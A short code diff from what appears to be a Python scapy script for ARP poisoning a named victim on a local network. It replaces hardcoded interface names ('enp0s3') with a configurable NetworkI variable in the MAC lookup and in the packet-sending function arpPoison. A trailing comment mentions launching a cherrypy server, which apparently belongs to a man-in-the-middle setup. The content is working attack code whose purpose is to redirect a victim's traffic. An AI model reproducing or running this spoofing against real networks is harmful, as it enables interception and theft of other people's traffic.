@@ -45,9 +45,9 @@ def ip_to_mac(IP, retry = 2, timeout = 2):
 # get the mac address of the victim
 vMAC = ip_to_mac(vIP);
 
-macAttacker = subprocess.check_output("cat /sys/class/net/enp0s3/address", shell = True)
+#macAttacker = subprocess.check_output("cat /sys/class/net/enp0s3/address", shell = True)
 #macAttacker = subprocess.check_output("cat /sys/class/net/eth0/address", shell = True)
-#macAttacker = subprocess.check_output("cat /sys/class/net/" + NetworkI +"/address", shell = True)
+macAttacker = subprocess.check_output("cat /sys/class/net/" + NetworkI +"/address", shell = True)
 
 #Create arp packet for victim
 arpVictim = Ether() / ARP()
@@ -59,9 +59,9 @@ arpVictim[ARP].pdst = vIP
 
 #Start arpPoison
 def arpPoison():
-    sendp(arpVictim, iface="enp0s3")
+    #endp(arpVictim, iface="enp0s3")
     #sendp(arpVictim, iface="eth0")
-    #sendp(arpVictim, iface=NetworkI)
+    sendp(arpVictim, iface=NetworkI)
     time.sleep(1)
 
 #Open new terminal with cherrypy server
